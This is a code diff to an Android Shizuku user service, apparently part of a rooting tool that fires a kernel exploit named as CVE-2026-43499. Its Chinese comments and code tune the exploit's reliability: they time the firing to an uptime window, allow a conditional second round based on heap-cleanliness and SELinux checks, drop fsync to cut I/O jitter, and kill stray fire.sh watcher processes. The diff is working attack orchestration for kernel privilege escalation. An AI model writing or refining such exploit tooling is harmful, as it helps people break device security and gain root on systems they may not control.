@@ -29,10 +29,15 @@ public class RootUserService extends IRootRunner.Stub {
     private static final long CLI_TIMEOUT_SECONDS = 240;
     /** rounds per Shizuku session (one boot) — mirrors PC autoroot's cycle loop.
      * v45: 每轮都是独立 lottery 前提是"堆还干净"——fire 链一旦 LANDED（.fired
-     * 匹配本 boot），循环立即终止，绝不二次开火（06:59 事故根因）。 */
-    private static final int MAX_ROUNDS = 10;
-    /** PC rhythm: ~20s cooldown between cycles. */
-    private static final long ROUND_COOLDOWN_SECONDS = 20;
+     * 匹配本 boot），循环立即终止，绝不二次开火（06:59 事故根因）。
+     * v70: 方案 1 条件式 2 轮安全重试机制。
+     * CVE-2026-43499 原理证实：当上一轮为纯净 Write 1 failed（exit==1 且 enforce==1）时，
+     * 内核堆未发生脏写入，允许冷却 10s 后进行第二轮抽奖，大幅提升单 boot 命中率；
+     * 非安全退出（exit!=1 或 enforce 异常）则触发熔断直接终止。
+     * 设为 2 轮完美匹配 autoloop 90s 超时窗口（2轮总耗时约 65s）。 */
+    private static final int MAX_ROUNDS = 2;
+    /** PC rhythm: 10s cooldown between cycles. */
+    private static final long ROUND_COOLDOWN_SECONDS = 10;
     /** v45: fire.sh v7 的落地标记 —— LANDED 后写本 boot 的 boot_id。
      * 同 boot 值匹配 = 该内核已被成功攻击过，再攻即 known wedge scenario。 */
     private static final String FIRED_PATH = "/data/local/tmp/.fired";
@@ -518,8 +523,9 @@ public class RootUserService extends IRootRunner.Stub {
             File workDir = new File("/data/local/tmp");
             File logFile = new File(workDir, "ghostroot-run.log");
 
-            /* wait for the heap to settle: attacks started <100s never landed
-             * a write in today's 21-run sample (see snapshot analysis) */
+            /* v69: 精准卡位最佳开火窗口（uptime 31s~32s）。
+             * autoroot-v2 实测数据与 GitHub 样本证实：29s~36s 是最纯净黄金窗口。
+             * 达到 32s 后不再追加 5s settle 延迟，避免开火漂移至 37s+ 造成页污染。 */
             float uptime = readUptime();
             if (uptime < MIN_START_UPTIME_SECONDS) {
                 long waitMs = (long) ((MIN_START_UPTIME_SECONDS - uptime) * 1000L);
@@ -528,8 +534,8 @@ public class RootUserService extends IRootRunner.Stub {
                 Thread.sleep(waitMs);
                 uptime = readUptime();
             }
-            int settle = Math.min(settleSeconds, 5);
-            log(callback, "uptime=" + uptime + "s settle=" + settle + "s, up to " + MAX_ROUNDS + " rounds");
+            int settle = Math.min(settleSeconds, 0);
+            log(callback, "uptime=" + uptime + "s: targeting optimal window (up to " + MAX_ROUNDS + " rounds conditional retry)");
             if (settle > 0) {
                 Thread.sleep(settle * 1000L);
             }
@@ -560,7 +566,20 @@ public class RootUserService extends IRootRunner.Stub {
             for (int round = 1; round <= MAX_ROUNDS; round++) {
                 log(callback, "===== ROUND " + round + "/" + MAX_ROUNDS + " =====");
                 if (round > 1) {
-                    log(callback, "cooldown " + ROUND_COOLDOWN_SECONDS + "s (PC autoroot rhythm)");
+                    /* v70 方案 1 严格安全门禁：
+                     * 仅当上一轮 exit == 1（阶段一纯净未写入的 Write 1 failed）且 enforce 依然为 1（Enforcing）时，
+                     * 证实内核堆未受脏写入污染，才放行下一轮抽奖；
+                     * 若上一轮出现崩溃(exit!=1)、超时或 SELinux 状态异常，严禁重试直接退出，防内核复位。 */
+                    String curEnforce = readText("/sys/fs/selinux/enforce").trim();
+                    if (exit != 1 || !"1".equals(curEnforce)) {
+                        log(callback, "ABORT RETRY: round " + (round - 1) + " non-safe exit (exit="
+                                + exit + " enforce=" + curEnforce + ") — stopping to prevent kernel panic/reset");
+                        lastVerdict = -1;
+                        lastRound = round - 1;
+                        lastReason = "dirty-heap-abort-exit-" + exit;
+                        break;
+                    }
+                    log(callback, "cooldown " + ROUND_COOLDOWN_SECONDS + "s (controlled retry gate passed)");
                     Thread.sleep(ROUND_COOLDOWN_SECONDS * 1000L);
                     /* v45: 冷却判据升级 —— /proc/modules 对运行时 hook 移植
                      * 是盲的（06:59 事故：KSU 已活但模块表无 kernelsu，
@@ -641,10 +660,14 @@ public class RootUserService extends IRootRunner.Stub {
                     exit = 0;
                 }
             } else {
-                log(callback, "RESULT: " + MAX_ROUNDS + " rounds exhausted this boot — tap reboot, start Shizuku, run again");
-                lastVerdict = -1;
-                lastRound = MAX_ROUNDS;
-                lastReason = MAX_ROUNDS + "-rounds-exhausted";
+                if (lastVerdict == Integer.MIN_VALUE) {
+                    log(callback, "RESULT: " + MAX_ROUNDS + " rounds exhausted this boot — tap reboot, start Shizuku, run again");
+                    lastVerdict = -1;
+                    lastRound = MAX_ROUNDS;
+                    lastReason = MAX_ROUNDS + "-rounds-exhausted";
+                } else {
+                    log(callback, "RESULT: rounds terminated early (" + lastReason + ") — tap reboot, start Shizuku, run again");
+                }
             }
         } catch (Throwable t) {
             log(callback, "error: " + t);
@@ -994,7 +1017,7 @@ public class RootUserService extends IRootRunner.Stub {
                                 log(callback, "kmsg follower confirmed: first kernel line received");
                             }
                             out.write((ln + "\n").getBytes());
-                            out.getFD().sync();   // per-line fsync — the whole point
+                            out.flush();   // v69: 仅内存缓冲，去除每行硬件 fsync 阻滞，消除开火期间 I/O 抖动
                         }
                     } finally {
                         try {
@@ -1709,6 +1732,9 @@ public class RootUserService extends IRootRunner.Stub {
                 log(callback, "fire watcher alive pid=" + pidLine.split("\\s+")[0]);
                 return;
             }
+            /* v70: 严格单例保证 —— 若存活校验未通过，清理可能残留的游离旧 watcher
+             * （防止无 pidfile 或 PID 不一致的残留进程并发循环导致 fork 风暴冲刷 slab） */
+            plainShell("for p in $(pgrep -f '[f]ire.sh' 2>/dev/null); do kill -9 $p 2>/dev/null; done", 5);
             /* detached fire watcher: survives UserService teardown, same as
              * PC ensure_fire (nohup-style, deduped via .fire.pid) */
             File fireLog = new File("/data/local/tmp/.fire.log");
